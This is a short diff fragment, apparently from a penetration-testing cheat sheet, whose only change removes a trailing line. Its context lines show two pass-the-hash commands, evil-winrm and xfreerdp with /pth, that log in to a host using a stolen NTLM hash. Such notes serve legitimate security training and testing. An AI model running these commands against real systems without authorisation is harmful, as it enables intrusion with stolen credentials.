@@ -57,4 +57,3 @@ evil-winrm -i $IP -u $USERNAME -H $HASH
 xfreerdp /v:$IP /u:$USERNAME /pth:$HASH
 ```
 
-- 
